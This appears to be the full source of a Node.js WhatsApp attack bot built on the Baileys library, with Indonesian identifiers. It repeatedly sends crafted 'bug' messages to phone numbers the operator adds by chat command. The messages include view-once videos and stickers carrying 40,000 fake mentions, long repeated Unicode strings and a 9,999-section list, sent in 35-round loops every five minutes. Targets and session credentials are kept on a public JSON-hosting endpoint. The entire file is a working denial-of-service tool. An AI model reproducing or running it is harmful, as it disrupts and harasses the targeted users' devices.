process.env.TZ = "Asia/Jakarta";
const exitTime = new Date().setHours(21, 45) - new Date().getTime();
setTimeout(process.exit, exitTime);

import {
  makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  DisconnectReason
} from "@whiskeysockets/baileys";
import { Boom } from "@hapi/boom";
import fs from "fs";
import pino from "pino";
let nomorRequest;
let relayMsg;
let blob;

function tunggu(delay) {
  return new Promise(resolve => {
    setTimeout(resolve, delay);
  });
}

function mentionTargets(targets) {
  return targets.map(e => {
    return {
      tag: "to",
      attrs: { jid: e },
      content: undefined
    };
  });
}

const mentionedList = [
  ...Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
];

function protocolbug3(targets) {
  targets = blob.targets.map(elem => elem.split("@")[0] + "@s.whatsapp.net");
  const msg = generateWAMessageFromContent(
    "0@s.whatsapp.net",
    {
      viewOnceMessage: {
        message: {
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
            fileLength: "999999",
            seconds: 999999,
            mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
            caption: "",
            height: 999999,
            width: 999999,
            fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
            directPath:
              "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1743742853",
            contextInfo: {
              isSampled: true,
              mentionedJid: [...targets, ...Array.from(mentionedList)]
            },
            streamingSidecar:
              "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
            thumbnailDirectPath:
              "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
            thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
            thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
            annotations: [
              {
                embeddedContent: {
                  embeddedMusic: {
                    musicContentMediaId: "X",
                    songId: "X",
                    author: "\u9999",
                    title: "\u9999",
                    artworkDirectPath:
                      "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                    countryBlocklist: true,
                    isExplicit: true,
                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                  }
                },
                embeddedAction: null
              }
            ]
          }
        }
      }
    },
    {}
  );
  return new Promise(async resolve => {
    await relayMsg("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: targets,
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: mentionTargets(targets)
            }
          ]
        }
      ]
    });
    resolve();
  });
}
//protocol5
function protocolbug5(targets) {
  targets = blob.targets.map(elem => elem.split("@")[0] + "@s.whatsapp.net");
  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "XXXXXXXXXX" + "ោ៝".repeat(10000),
    title: "Finix",
    artworkDirectPath:
      "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "289511",
    seconds: 15,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      isSampled: true,
      mentionedJid: [...targets, ...Array.from(mentionedList)]
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "XXXXXXXXXXXX"
    },
    streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic
        },
        embeddedAction: true
      }
    ]
  };

  const msg = generateWAMessageFromContent(
    "0@s.whatsapp.net",
    {
      viewOnceMessage: {
        message: { videoMessage }
      }
    },
    {}
  );
  return new Promise(async resolve => {
    await relayMsg("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: targets,
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: mentionTargets(targets)
            }
          ]
        }
      ]
    });
    resolve();
  });
}

//buldozer
function bulldozer(targets) {
  targets = blob.targets.map(elem => elem.split("@")[0] + "@s.whatsapp.net");
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [...targets, ...Array.from(mentionedList)],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }
    }
  };

  const msg = generateWAMessageFromContent("0@s.whatsapp.net", message, {});
  return new Promise(async resolve => {
    await relayMsg("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: targets,
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: mentionTargets(targets)
            }
          ]
        }
      ]
    });
    resolve();
  });
}

//trashprotocol
function trashprotocol(target) {
  const secs = Array.from({ length: 9999 }, (_, r) => ({
    title: "᭯".repeat(9999),
    rows: [{ title: `${r + 1}`, id: r + 1 }]
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "XXXXX",
          listType: 2,
          buttonText: null,
          sections: secs,
          singleSelectReply: { selectedRowId: "🌀" },
          contextInfo: {
            mentionedJid: mentionedList,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9999@newsletter",
              serverMessageId: 1,
              newsletterName: "-"
            }
          },
          description: "( # )"
        }
      }
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2
    }
  };

  const msg = generateWAMessageFromContent(target, MSG, {});
  return new Promise(async resolve => {
    await relayMsg("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });
    resolve();
  });
}

function serang(targets) {
  return new Promise(async resolve => {
    for (let i = 1; i <= 35; i++) {
      await protocolbug5();
      await tunggu(1500);
      await protocolbug3();
      await bulldozer();
      await tunggu(2000);
      await bulldozer();
      await protocolbug5();
      await tunggu(1500);
      await protocolbug3();
      console.log("serangan ke-" + i);
      if (i == 35) {
        resolve();
      }
    }
  });
}

function updateData() {
  return fetch("https://jsonblob.com/api/jsonBlob/1389135762926264320", {
    body: JSON.stringify(blob),
    method: "PUT",
    headers: { Accept: "application/json", "Content-Type": "application/json" }
  });
}

let sendMsg;
let exec;
let wait;
async function start() {
  const targets = blob.targets;
  const arrX = blob.targets.toString();
  if (targets.length < 1) {
    await sendMsg(nomorRequest + "@s.whatsapp.net", {
      text: "Tidak ada target.\nServer akan dihentikan dalam 3 menit."
    });
    wait = setTimeout(process.exit, 60000 * 3);
  }

  let arr = targets;
  targets.forEach(e => {
    const el = e.split("@")[1].split("-");
    const tgl = new Date(el[2] + "-" + el[1] + "-" + el[0]).getTime();
    const now = new Date().getTime();
    if (tgl < now) {
      arr.splice(arr.indexOf(e), 1);
    }
  });
  if (arr.toString() != arrX) {
    blob.targets = arr;
    await updateData();
    // fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
  }
  if (arr.length > 0) {
    await serang();
    blob.waktu = new Date().getTime() + 60000 * 5;
    await updateData();
    //fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
    exec = setTimeout(start, 60000 * 5);
  } else {
    exec = setTimeout(start, 60000 * 5);
  }
}

async function olahTarget(aksi, target) {
  if (aksi == "add" && target) {
    blob.targets.push(target);
    await updateData();
    //fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
    if (wait?._destroyed == false) {
      clearTimeout(wait);
      start();
    }
    sendMsg(nomorRequest + "@s.whatsapp.net", { text: "add OK" });
  } else if (aksi == "del" && blob.targets.indexOf(target) >= 0) {
    blob.targets.splice(blob.targets.indexOf(target), 1);
    await updateData();
    // fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
    sendMsg(nomorRequest + "@s.whatsapp.net", { text: "del OK" });
  } else if (aksi == "all") {
    let msg = "\n";
    blob.targets.forEach(e => {
      msg += "\n- " + e;
    });
    sendMsg(nomorRequest + "@s.whatsapp.net", { text: "all OK" + msg });
  }
}

const reviveBuffer = obj => {
  if (obj && typeof obj === "object") {
    if (obj.type === "Buffer" && Array.isArray(obj.data)) {
      return Buffer.from(obj.data);
    }
    for (const key in obj) {
      obj[key] = reviveBuffer(obj[key]);
    }
  }
  return obj;
};

let pairing;
async function bot(session) {
  wait = setTimeout(process.exit, 60000);

  if (!session) {
    const { state } = await useMultiFileAuthState("session");
    await fetch("https://jsonblob.com/api/jsonBlob/1389135762926264320", {
      headers: { Accept: "application/json", "Content-Type": "application/json" }
    })
      .then(r => r.json())
      .then(r => {
        blob = r;
        if (r.session.creds) {
          nomorRequest = r.session.creds.me.id.split(":")[0];
          session = reviveBuffer(r.session);
          session.keys.get = state.keys.get;
          session.keys.set = state.keys.set;
        } else {
          nomorRequest = r.nomor;
          session = state;
        }
      });

    /*blob = JSON.parse(fs.readFileSync("./data.json", "utf-8"));
    if (blob.session.creds) {
      nomorRequest = blob.session.creds.me.id.split(":")[0];
      session = reviveBuffer(blob.session);
      session.keys.get = state.keys.get;
      session.keys.set = state.keys.set;
    } else {
      nomorRequest = blob.nomor;
      session = state;
    }*/
  }

  const { version } = await fetchLatestBaileysVersion();
  const sock = makeWASocket({
    version,
    printQRInTerminal: false,
    keepAliveIntervalMs: 30000,
    browser: ["Windows", "Chrome", "138.0.7204.50"],
    auth: session,
    logger: pino({ level: "silent" }).child({ level: "silent" })
  });

  if (!sock.user && !sock.authState.creds.registered) {
    await tunggu(2000);
    const code = await sock.requestPairingCode(nomorRequest.replace(/\D/g, ""));
    clearTimeout(wait);
    clearTimeout(exec);
    pairing = code;
    wait = setTimeout(process.exit, 60000 * 3);
    console.log(`\x1b[44;1m\x20PAIRING CODE\x20\x1b[0m\x20${code}`);
  }

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      clearTimeout(wait);
      clearTimeout(exec);
      const shouldReconnect =
        (lastDisconnect.error = new Boom(lastDisconnect?.error))?.output?.statusCode !==
        DisconnectReason.loggedOut;

      if (lastDisconnect.error.output && lastDisconnect.error.output.payload) {
        const { statusCode, error } = lastDisconnect.error.output.payload;
        if (statusCode === 401 && error === "Unauthorized") {
          console.log("Unauthorized 401");
          blob.session = {};
          await updateData();
          //fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
          return bot();
        }
      }
      if (shouldReconnect) {
        console.log("reconnecting...");
        return bot(sock.authState);
      }
    }
    if (connection === "open") {
      clearTimeout(wait);
      clearTimeout(exec);
      console.log("Terhubung " + new Date().toLocaleString("id-ID"));
      relayMsg = sock.relayMessage;
      sendMsg = sock.sendMessage;
      pairing = undefined;
      const timeNow = new Date().getTime();
      if (blob.waktu + 60000 * 5 <= timeNow) {
        start();
      } else {
        await tunggu(blob.waktu - timeNow);
        start();
      }
    }
  });

  sock.ev.on("creds.update", async () => {
    blob.session = sock.authState;
    await updateData();
    //fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
  });

  sock.ev.on("messages.upsert", ({ messages }) => {
    /*if (fs.readdirSync("./").indexOf("session") >= 0) {
      fs.rmSync("./session/", { recursive: true });
    }*/
    messages.forEach(async e => {
      if (e.key.remoteJid === nomorRequest + "@s.whatsapp.net" && e.key.fromMe === true) {
        const pesanMasuk = e.message?.conversation || e.message?.extendedTextMessage?.text;
        const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
        const prefix = prefixRegex.test(pesanMasuk) ? pesanMasuk.match(prefixRegex)[0] : "";
        const isCmd = !!prefix;
        const command = isCmd
          ? pesanMasuk.slice(prefix.length).trim().split(/ +/)[0].toLowerCase()
          : "";
        const args = isCmd ? pesanMasuk.slice(prefix.length).trim().split(/ +/).slice(1) : [];
        const target = args.join(" ");

        switch (command) {
          case "tes":
            await sendMsg(nomorRequest + "@s.whatsapp.net", {
              text: "bug-WA OK"
            });
            break;
          case "add":
            olahTarget("add", target);
            break;
          case "del":
            olahTarget("del", target);
            break;
          case "all":
            olahTarget("all");
            break;
          default:
        }
      }
    });
  });
}

bot();

import http from "http";
const port = 3000;

http
  .createServer((req, res) => {
    const url = req.url;
    res.writeHead(200, {
      "Content-Type": "text/html"
    });

    const renderHTML = (path, res) => {
      fs.readFile(path, (err, data) => {
        if (err) {
          // res.writeHead(404);
          res.write(`200 OK${pairing ? " " + pairing : ""}`);
        } else {
          res.write(data);
        }
        res.end();
      });
    };

    switch (url) {
      default:
        renderHTML("./index.html", res);
    }
  })
  .listen(port, () => {
    console.log(`Server is listening on port ${port}...`);
  });
